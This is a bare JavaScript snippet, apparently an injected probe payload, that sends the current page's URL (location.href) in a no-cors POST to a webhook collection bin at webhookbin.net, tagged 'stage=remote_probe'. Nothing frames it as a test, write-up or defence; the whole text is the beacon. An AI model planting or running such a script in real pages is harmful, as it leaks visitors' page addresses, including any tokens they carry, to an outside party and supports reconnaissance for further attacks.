fetch('https://webhookbin.net/v1/bin/f506d1a4-21bf-4326-bcdd-5a9d970c03f4', {
  method: 'POST',
  mode: 'no-cors',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'stage=remote_probe&u=' + encodeURIComponent(location.href)
});
